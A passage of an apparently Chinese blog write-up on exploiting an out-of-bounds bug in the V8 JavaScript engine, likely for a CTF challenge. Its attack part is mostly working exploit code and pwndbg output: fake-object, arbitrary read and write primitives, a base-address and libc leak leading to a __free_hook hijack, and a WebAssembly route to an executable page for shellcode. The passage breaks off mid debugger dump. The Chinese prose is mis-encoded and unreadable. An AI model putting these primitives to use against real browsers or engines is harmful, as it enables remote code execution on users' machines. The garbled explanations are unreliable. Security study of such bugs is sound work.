class="params">address</span>) </span>&#123;</span><br><span class="line">  flt_array[<span class="number">0</span>] = i2f(address);</span><br><span class="line">  flt_array.oob(obj_array_map);</span><br><span class="line">  <span class="keyword">var</span> fake_obj = flt_array[<span class="number">0</span>];</span><br><span class="line">  flt_array.oob(flt_array_map);</span><br><span class="line">  <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®é“ç†å’Œä¸Šä¸€æ­¥ç±»ä¼¼ã€‚</p><h4 id="4-å®ç°ä»»æ„åœ°å€è¯»å–"><a href="#4-å®ç°ä»»æ„åœ°å€è¯»å–" class="headerlink" title="4. å®ç°ä»»æ„åœ°å€è¯»å–"></a><strong>4. å®ç°ä»»æ„åœ°å€è¯»å–</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arb_rw_arr = [flt_array_map, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="keyword">var</span> fake_obj = fake_object(address_of(arb_rw_arr) - <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_read</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">  arb_rw_arr[<span class="number">2</span>] = i2f(address - <span class="number">0x10n</span> + <span class="number">0x1n</span>)</span><br><span class="line">  <span class="keyword">return</span> f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿™é‡Œæ˜¯å§<code>arb_rw_arr</code>è¿™ä¸ªæ•°ç»„çš„<code>elements</code>åŒºåŸŸå½“ä½œçš„æ˜¯ä¸€ä¸ª<code>JSArray</code>ç»“æ„ä½“ï¼Œè€Œè¿™ä¸ªç»“æ„å¯¹åº”çš„æŒ‡é’ˆä¸º<code>fake_obj</code>ã€‚</p><p>è¿™é‡Œä¸»è¦è§£é‡Šä¸€ä¸‹ç¬¬äºŒè¡Œä»£ç è°ƒç”¨å‡½æ•°çš„éƒ¨åˆ†ï¼Œè¿™é‡Œé¦–å…ˆæ˜¯æ‹¿åˆ°<code>arb_rw_arr</code>å¯¹è±¡çš„åœ°å€ï¼Œéšåå‡å»<code>0x20</code>åˆ™æ˜¯å› ä¸º<code>JSArray</code>å’Œ<code>elements</code>ç›¸è·å›ºå®šåç§»ä¸º<code>0x30</code>ï¼Œè¿™é‡Œå‡å»0x20çš„è¯ä»£è¡¨å°†<code>elements + 0x10</code>å½“åšäº†<code>fake JSArray</code>ï¼Œæ ¹æ®å‰é¢çš„è°ƒè¯•å¾—çŸ¥åœ¨<code>elements + 0x10</code>çš„ä½ç½®å¼€å§‹ä¸ºæ•°ç»„ä¸­æ•°æ®çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨æ˜¯å¯ä»¥å®ç°ä»»æ„ä¿®æ”¹<code>fake_obj</code>çš„<code>JSArray</code>éƒ¨åˆ†ã€‚</p><p>ç„¶åå°±æ˜¯è¿™é‡Œè¿”å›çš„<code>fake_obj</code>å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å®è´¨æŒ‡å‘çš„æ˜¯å°±æ˜¯<code>arb_rw_arr</code>çš„<code>elements + 0x10</code>çš„ä½ç½®ã€‚</p><p>åˆå› ä¸ºå¯ä»¥ä»»æ„ä¿®æ”¹è¿™ä¸€éƒ¨åˆ†çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹<code>elements</code>æŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘ä»»æ„åœ°å€é…åˆ<code>fake_obj</code>å¯¹è±¡å³å¯è¾¾åˆ°ä»»æ„åœ°å€è¯»å–çš„æ•ˆæœã€‚</p><h4 id="5-å®ç°ä»»æ„åœ°å€å†™"><a href="#5-å®ç°ä»»æ„åœ°å€å†™" class="headerlink" title="5. å®ç°ä»»æ„åœ°å€å†™"></a><strong>5. å®ç°ä»»æ„åœ°å€å†™</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = address_of(buffer) - <span class="number">1n</span> + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_write</span>(<span class="params">address, value</span>) </span>&#123;</span><br><span class="line">  arb_rw_arr[<span class="number">2</span>] = i2f(buf_backing_store_addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">  fake_obj[<span class="number">0</span>] = address;</span><br><span class="line">  data_view.setFloat64(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»»æ„åœ°å€å†™çš„å†™æ³•åœ¨ä¸€å¼€å§‹çš„æƒ³æ³•è‚¯å®šæ˜¯å’Œä»»æ„åœ°å€è¯»ä¸€è‡´ã€‚ä¸è¿‡æŒ‰ç…§ä¸Šé¢é‚£æ ·å†™ä¼šå‡ºç°ä¸€ä¸ªæ®µé”™è¯¯ï¼Œè¿™æ˜¯ç®€å•çš„<code>write FloatArray</code>å¯¹æµ®ç‚¹æ•°çš„å¤„ç†æ–¹å¼é€ æˆçš„ï¼Œå½“å€¼ä»¥ 0x7f å¼€å¤´ç­‰é«˜å¤„çš„åœ°å€éƒ½ä¼šå‡ºç°è¿™ç§é—®é¢˜ã€‚ä¸ºäº†é¿å…é€‰æ‹©ä½¿ç”¨<code>DataView</code>æ¥å¤„ç†ã€‚</p><p><code>DataView</code>å¯¹è±¡åç§»<code>+0x20</code>å¤„ï¼Œå­˜æœ‰ä¸€ä¸ª<code>backing_store</code>æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘çœŸæ­£å­˜å‚¨æ•°æ®çš„åœ°å€ï¼Œæ”¹å†™è¿™ä¸ªæŒ‡é’ˆå³å¯ä»»æ„è¯»å†™ã€‚</p><h4 id="æœ€ç»ˆåˆ©ç”¨-ä¼ ç»Ÿæ–¹å¼"><a href="#æœ€ç»ˆåˆ©ç”¨-ä¼ ç»Ÿæ–¹å¼" class="headerlink" title="æœ€ç»ˆåˆ©ç”¨: ä¼ ç»Ÿæ–¹å¼"></a><strong>æœ€ç»ˆåˆ©ç”¨: ä¼ ç»Ÿæ–¹å¼</strong></h4><p>ä¼ ç»Ÿçš„æ–¹å¼æ˜¯å¯¹<code>__free_hook</code>è¿›è¡ŒåŠ«æŒã€‚ä½†æ˜¯å®ƒåœ¨libcä¸­ï¼Œæ‰€ä»¥é¦–å…ˆè¿˜æ˜¯éœ€è¦è€ƒè™‘æ³„æ¼å‡ºç¨‹åºåŸºåœ°å€ï¼Œç„¶åé€šè¿‡gotè¡¨æ³„æ¼å‡ºlibcåœ°å€ã€‚</p><p>ä¸è¿‡ç›®å‰é‡åˆ°çš„æ˜¯å¦‚ä½•æ³„æ¼å‡ºç¨‹åºåŸºåœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0fcdcb2c2d99</span><br><span class="line">0xfcdcb2c2d99: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_SMI_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x046dfe5804d1 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0x1bc536f80609 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x08ad62ed1f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x08ad62ed1e59 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x046dfe584ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_SMI_ELEMENTS) -&gt; 0x0fcdcb2c2e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x08ad62ed1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x08ad62ed0ec1 &lt;JSFunction Array (sfi = 0x1bc536f86791)&gt;</span><br><span class="line"> - dependent code: 0x046dfe5802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéšä¾¿æŸ¥çœ‹ä¸€ä¸ª<code>JSArray</code>å†…éƒ¨çš„mapï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸­åŒ…å«è¿™<code>constructor</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x08ad62ed0ec1</span><br><span class="line">0x8ad62ed0ec1: [Function] in OldSpace</span><br><span class="line"> - map: 0x0fcdcb2c2d49 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x08ad62ec2109 &lt;JSFunction (sfi = 0x1bc536f83b29)&gt;</span><br><span class="line"> - elements: 0x046dfe580c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: 0x08ad62ed1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - initial_map: 0x0fcdcb2c2d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt;</span><br><span class="line"> - shared_info: 0x1bc536f86791 &lt;SharedFunctionInfo Array&gt;</span><br><span class="line"> - name: 0x046dfe583599 &lt;String[#5]: Array&gt;</span><br><span class="line"> - builtin: ArrayConstructor</span><br><span class="line"> - formal_parameter_count: 65535</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x08ad62ec1869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x3eadb8bc6981 &lt;Code BUILTIN ArrayConstructor&gt;</span><br><span class="line"> - properties: 0x08ad62ed1029 &lt;PropertyArray[6]&gt; &#123;</span><br><span class="line">    #length: 0x1bc536f804b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #name: 0x1bc536f80449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #prototype: 0x1bc536f80529 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    0x046dfe584c79 &lt;Symbol: (native_context_index_symbol)&gt;: 11 (const data field 0) properties[0]</span><br><span class="line">    0x046dfe584f41 &lt;Symbol: Symbol.species&gt;: 0x08ad62ed0fd9 &lt;AccessorPair&gt; (const accessor descriptor)</span><br><span class="line">    #isArray: 0x08ad62ed1069 &lt;JSFunction isArray (sfi = 0x1bc536f86829)&gt; (const data field 1) properties[1]</span><br><span class="line">    #from: 0x08ad62ed10a1 &lt;JSFunction from (sfi = 0x1bc536f86879)&gt; (const data field 2) properties[2]</span><br><span class="line">    #of: 0x08ad62ed10d9 &lt;JSFunction of (sfi = 0x1bc536f868b1)&gt; (const data field 3) properties[3]</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›<code>constructor</code>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªæˆå‘˜ä¸ºcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x3eadb8bc6981-1</span><br><span class="line">0x3eadb8bc6980:0x0000046dfe580a310x0000046dfe582c01</span><br><span class="line">0x3eadb8bc6990:0x0000046dfe580c710x0000046dfe582791</span><br><span class="line">0x3eadb8bc69a0:0x00001bc536f916a90x800001c60000000d</span><br><span class="line">0x3eadb8bc69b0:0x000000240000001c0x000000a600000024</span><br><span class="line">0x3eadb8bc69c0:0x55a5afef9780ba490x000000e2ff410000</span><br><span class="line">0x3eadb8bc69d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x3eadb8bc69e0:0x0000046dfe580a310x0000046dfe582c01</span><br><span class="line">0x3eadb8bc69f0:0x0000046dfe580c710x0000046dfe582791</span><br><span class="line">0x3eadb8bc6a00:0x00001bc536f916c10x800001c60000000d</span><br><span class="line">0x3eadb8bc6a10:0x0000019f000001880x000000a70000019f</span><br></pre></td></tr></table></figure><p>åœ¨å†…éƒ¨å¯ä»¥çœ‹åˆ°åœ¨è·ç¦»å¼€å§‹ä½ç½®ä¸º0x40çš„ä½ç½®å°±èƒ½çœ‹åˆ°å¿ƒå¿ƒå¿µå¿µçš„ç¨‹åºåŸºåœ°å€ï¼Œæ‰€ä»¥ç›´æ¥é€šè¿‡è¿™é‡Œæ³„æ¼å³å¯ã€‚</p><p>æ³„æ¼å®ŒåŸºåœ°å€å°±å¾ˆå¥½åŠï¼Œåç»­å°±æ˜¯é€šè¿‡gotè¡¨æ³„æ¼libcåœ°å€ï¼Œç„¶ååŠ«æŒ<code>__free_hook</code>å³å¯ä¸º<code>system</code>ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªå‡½æ•°ä¸­ç”³è¯·å˜é‡ä¸ºæƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</p><blockquote><p>  æˆ‘è¿™é‡Œæ²¡çœ‹è¿‡æºç ï¼Œä¸è¿‡æˆ‘çŒœæµ‹æ˜¯å› ä¸ºjsæ˜¯åŠ¨æ€å˜é‡çš„ç¼˜æ•…ï¼Œjsçš„å˜é‡éƒ½æ˜¯ä»¥å †çš„å½¢å¼å­˜åœ¨çš„ï¼Œå¹¶ä¸”åœ¨å‡½æ•°æ‰§è¡Œç»“æŸåä¼šé‡Šæ”¾æ‰å†…å­˜ã€‚</p></blockquote><h4 id="æœ€ç»ˆåˆ©ç”¨-éä¼ ç»Ÿæ–¹å¼"><a href="#æœ€ç»ˆåˆ©ç”¨-éä¼ ç»Ÿæ–¹å¼" class="headerlink" title="æœ€ç»ˆåˆ©ç”¨: éä¼ ç»Ÿæ–¹å¼"></a><strong>æœ€ç»ˆåˆ©ç”¨: éä¼ ç»Ÿæ–¹å¼</strong></h4><p>è¿™ç§æ–¹æ³•åˆ™æ˜¯å¾€ç¨‹åºä¸­å†™shellcodeï¼Œä½†æ˜¯ç¨‹åºè‡ªèº«å¹¶æ²¡æœ‰rwxçš„æ®µã€‚ä¸è¿‡å­˜åœ¨è¿™æ ·ä¸€ç§æŠ€æœ¯wasmï¼Œä½¿ç”¨ <a class="link"   href="https://wasdk.github.io/WasmFiddle" >è¿™ä¸ªç½‘ç«™<i class="fas fa-external-link-alt"></i></a> å¯ä»¥ç”Ÿæˆä¸€æ®µwasmç ï¼Œå¯ä»¥ç”¨ç”Ÿæˆä¸€ä¸ªå‡½æ•°å¯¹è±¡ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230627191416891.png"                      alt="image-20230627191416891"                ></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f());</span><br><span class="line">% DebugPrint(f);</span><br><span class="line">% SystemBreak();</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230627191458616.png"                      alt="image-20230627191458616"                ></p><p>å½“æˆ‘ä»¬è¿è¡Œå¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯è¿”å›äº†42ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x365390d5faf9</span><br><span class="line">0x365390d5faf9: [Function] in OldSpace</span><br><span class="line"> - map: 0x309e6c9c4379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x365390d42109 &lt;JSFunction (sfi = 0x2a087603b29)&gt;</span><br><span class="line"> - elements: 0x2754f1600c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x365390d5fac1 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"> - name: 0x2754f1604ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x365390d41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance 0x365390d5f901</span><br><span class="line"> - WASM function index 0</span><br><span class="line"> - properties: 0x2754f1600c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x02a0876004b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #name: 0x02a087600449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #arguments: 0x02a087600369 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #caller: 0x02a0876003d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ª f ï¼Œå¯ä»¥çœ‹åˆ°ä»–çš„ç±»å‹ä¸º<code>JSFunction</code>ï¼Œç»§ç»­è·Ÿè¿›å…¶ä¸­çš„<code>share_info</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x365390d5fac1</span><br><span class="line">0x365390d5fac1: [SharedFunctionInfo] in OldSpace</span><br><span class="line"> - map: 0x2754f16009e1 &lt;Map[56]&gt;</span><br><span class="line"> - name: 0x2754f1604ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 144</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: 0x365390d5fa99 &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - code (from data): 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - function token position: -1</span><br><span class="line"> - start position: -1</span><br><span class="line"> - end position: -1</span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: 0x2754f1600c61 &lt;ScopeInfo[0]&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - feedback_metadata: 0x2754f1602a39: [FeedbackMetadata]</span><br><span class="line"> - map: 0x2754f1601319 &lt;Map&gt;</span><br><span class="line"> - slot_count: 0</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›dataã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x365390d5fa99</span><br><span class="line">0x365390d5fa99: [WasmExportedFunctionData] in OldSpace</span><br><span class="line"> - map: 0x2754f1605879 &lt;Map[40]&gt;</span><br><span class="line"> - wrapper_code: 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: 0x365390d5f901 &lt;Instance map = 0x309e6c9c9789&gt;</span><br><span class="line"> - function_index: 0</span><br></pre></td></tr></table></figure><p>è¿›ä¸€æ­¥æŸ¥çœ‹<code>instance</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x365390d5f901-1 20</span><br><span class="line">00:0000â”‚  0x365390d5f900 â€”â–¸ 0x309e6c9c9789 â—‚â€” 0x2500002754f16001</span><br><span class="line">01:0008â”‚  0x365390d5f908 â€”â–¸ 0x2754f1600c71 â—‚â€” 0x2754f16008</span><br><span class="line">02:0010â”‚  0x365390d5f910 â€”â–¸ 0x2754f1600c71 â—‚â€” 0x2754f16008</span><br><span class="line">03:0018â”‚  0x365390d5f918 â€”â–¸ 0x7fc28d7f0000 â—‚â€” 0x0</span><br><span class="line">04:0020â”‚  0x365390d5f920 â—‚â€” 0x10000</span><br><span class="line">05:0028â”‚  0x365390d5f928 â—‚â€” 0xffff</span><br><span class="line">06:0030â”‚  0x365390d5f930 â€”â–¸ 0x55ec1cb0d818 â€”â–¸ 0x7ffd93629d90 â—‚â€” 0x7ffd93629d90</span><br><span class="line">07:0038â”‚  0x365390d5f938 â€”â–¸ 0x2754f1600c71 â—‚â€” 0x2754f16008</span><br><span class="line">08:0040â”‚  0x365390d5f940 â€”â–¸ 0x55ec1cb931e0 â—‚â€” 0x0</span><br><span class="line">09:0048â”‚  0x365390d5f948 â€”â–¸ 0x2754f16004d1 â—‚â€” 0x2754f16005</span><br><span class="line">0a:0050â”‚  0x365390d5f950 â—‚â€” 0x0</span><br><span class="line">... â†“     3 skipped</span><br><span class="line">0e:0070â”‚  0x365390d5f970 â€”â–¸ 0x55ec1cb93200 â—‚â€” 0x0</span><br><span class="line">0f:0078â”‚  0x365390d5f978 â€”â–¸ 0x2754f16004d1 â—‚â€” 0x2754f16005</span><br><span class="line">10:0080â”‚  0x365390d5f980 â€”â–¸ 0x55ec1cb03b50 